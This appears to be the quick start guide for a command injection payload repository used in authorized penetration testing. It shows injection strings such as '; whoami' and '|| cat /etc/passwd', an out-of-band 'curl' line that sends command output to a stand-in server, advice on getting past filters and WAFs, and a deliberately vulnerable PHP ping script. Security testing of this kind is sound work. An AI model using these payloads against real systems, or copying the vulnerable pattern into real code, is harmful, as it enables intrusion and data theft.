# Quick Start Guide

Get started with the Command Injection Payload List in under 5 minutes!

## 🚀 Installation

### Step 1: Clone the Repository

```bash
git clone https://github.com/payload-box/command-injection-payload-list.git
cd command-injection-payload-list
```

### Step 2: Explore the Payloads

```bash
# List all payload files
ls -la Intruder/

# View a specific payload file
cat Intruder/command-injection-basic.txt
```

## 🎯 Choose Your Payload File

| Testing Scenario | Recommended File |
|------------------|------------------|
| First-time testing / Initial discovery | `command-injection-basic.txt` |
| No visible output (blind injection) | `command-injection-time-based.txt` |
| WAF/Filter present | `command-injection-bypass.txt` |
| Need to extract data | `command-injection-data-exfiltration.txt` |
| Testing Windows systems | `command-injection-windows.txt` |
| Testing Linux/Unix systems | `command-injection-linux.txt` |
| Advanced evasion needed | `command-injection-obfuscated.txt` |
| URL encoding issues | `command-injection-encoded.txt` |
| Out-of-band testing | `command-injection-out-of-band.txt` |
| Testing special characters | `command-injection-special-chars.txt` |
| Complex context breaking | `command-injection-polyglot.txt` |

## 🔧 Using with Burp Suite

### Method 1: Intruder

1. **Capture Request**: Intercept the target request in Burp Proxy
2. **Send to Intruder**: Right-click → "Send to Intruder"
3. **Set Injection Point**: 
   - Go to "Positions" tab
   - Click "Clear §"
   - Highlight the parameter value
   - Click "Add §"
4. **Load Payloads**:
   - Go to "Payloads" tab
   - Click "Load..." under "Payload Options"
   - Select your payload file (e.g., `command-injection-basic.txt`)
5. **Configure Settings**:
   - Set "Payload encoding" if needed
   - Add grep matches for detection
6. **Start Attack**: Click "Start attack"

### Method 2: Repeater (Manual Testing)

1. Send request to Repeater
2. Open a payload file in a text editor
3. Copy payloads one by one
4. Paste into the vulnerable parameter
5. Send and analyze responses

## 🦊 Using with OWASP ZAP

1. **Intercept Request**: Use ZAP proxy to capture the request
2. **Fuzzer**:
   - Right-click on request → "Attack" → "Fuzz"
   - Highlight injection point
   - Click "Add..."
3. **Add Payloads**:
   - Select "File" from dropdown
   - Click "Select..." and choose payload file
   - Click "Add"
4. **Start Fuzzer**: Click "Start Fuzzer"

## 🐍 Using with Python

```python
import requests

# Read payloads from file
with open('Intruder/command-injection-basic.txt', 'r') as f:
    payloads = [line.strip() for line in f]

# Test each payload
for payload in payloads:
    url = f"http://target.com/api?cmd=ping&ip=127.0.0.1{payload}"
    response = requests.get(url)
    
    # Check for successful injection
    if "root:" in response.text or response.elapsed.total_seconds() > 5:
        print(f"[+] Potential vulnerability found: {payload}")
```

## 🔍 Detection Methods

### Method 1: Direct Output Detection
Look for command output in the response:
```
Test payload: ; whoami
Expected output: username or system info in response
```

### Method 2: Time-Based Detection
Measure response delays:
```
Test payload: ; sleep 10
Expected result: Response takes ~10 seconds
```

### Method 3: Out-of-Band Detection
Trigger external connections:
```
Test payload: ; curl http://your-server.com/$(whoami)
Expected result: HTTP request to your server with data
```

## 📝 Testing Checklist

- [ ] Identify potential injection points (URL params, POST data, headers)
- [ ] Test with basic payloads first
- [ ] Try different operators (`;`, `|`, `||`, `&`, `&&`)
- [ ] If blocked, use bypass techniques
- [ ] Use time-based detection if no output
- [ ] Try platform-specific payloads
- [ ] Document findings thoroughly

## 🎯 Example Test Cases

### Test Case 1: URL Parameter

**Target**: `http://example.com/ping?ip=127.0.0.1`

**Test**:
```
http://example.com/ping?ip=127.0.0.1; whoami
http://example.com/ping?ip=127.0.0.1| id
http://example.com/ping?ip=127.0.0.1|| cat /etc/passwd
```

### Test Case 2: POST Data

**Request**:
```http
POST /api/system HTTP/1.1
Host: example.com
Content-Type: application/json

{"command": "ping", "target": "127.0.0.1"}
```

**Test**:
```json
{"command": "ping", "target": "127.0.0.1; whoami"}
{"command": "ping", "target": "127.0.0.1| id"}
```

### Test Case 3: HTTP Header

**Request**:
```http
GET /api/status HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
X-Forwarded-For: 127.0.0.1
```

**Test**:
```http
X-Forwarded-For: 127.0.0.1; whoami
X-Forwarded-For: 127.0.0.1| id
```

## 🛡️ Setting Up Test Environment

### Option 1: DVWA (Damn Vulnerable Web Application)

```bash
# Using Docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Access: http://localhost
# Username: admin
# Password: password
```

### Option 2: Custom Vulnerable Script

**PHP Example** (vulnerable.php):
```php
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
```

**Test**:
```
http://localhost/vulnerable.php?ip=127.0.0.1; whoami
```

## ⚡ Pro Tips

1. **Start Simple**: Begin with basic payloads before trying complex ones
2. **Use Grep**: Add grep patterns in Burp to automatically highlight successful injections
3. **Check Response Time**: Time-based detection is reliable for blind injection
4. **Try Multiple Operators**: What works with `;` might not work with `|`
5. **URL Encode**: Some applications require URL-encoded payloads
6. **Check All Parameters**: Test every input field, not just obvious ones
7. **Read Documentation**: Check CHEAT_SHEET.md for detailed techniques

## 🚨 Common Mistakes to Avoid

❌ Testing production systems without permission  
❌ Using destructive payloads  
❌ Not documenting your tests  
❌ Ignoring false positives  
❌ Testing only one injection point  
❌ Giving up after first filter  
❌ Not trying platform-specific payloads  

## 📖 Next Steps

1. **Read the Full Documentation**: Check out README.md for comprehensive info
2. **Review Cheat Sheet**: CHEAT_SHEET.md has detailed technique explanations
3. **Practice**: Set up a vulnerable environment and practice
4. **Contribute**: Found new payloads? See CONTRIBUTING.md
5. **Stay Updated**: Watch the repository for new payloads and techniques

## 🆘 Troubleshooting

**Q: Payloads aren't working?**
- Try different operators (`;`, `|`, `||`, etc.)
- Check if input is filtered or encoded
- Try bypass techniques from `command-injection-bypass.txt`
- Verify the target platform (Windows vs Linux)

**Q: Getting false positives?**
- Verify with multiple different commands
- Use time-based confirmation
- Check for actual command execution evidence

**Q: Application seems protected?**
- Use obfuscated payloads
- Try special characters and encoding
- Test with polyglot payloads
- Consider WAF bypass techniques

## 📞 Need Help?

- **Documentation**: Check README.md and CHEAT_SHEET.md
- **Issues**: Open a GitHub issue for bugs or questions
- **Contributions**: See CONTRIBUTING.md to add new payloads

## ⚠️ Legal Reminder

**ALWAYS OBTAIN WRITTEN AUTHORIZATION BEFORE TESTING**

Only test on:
- Systems you own
- Systems you have explicit permission to test
- Authorized bug bounty programs
- Intentionally vulnerable practice applications

Unauthorized access is illegal and can result in criminal charges.

---

**Happy (ethical) testing! 🔒**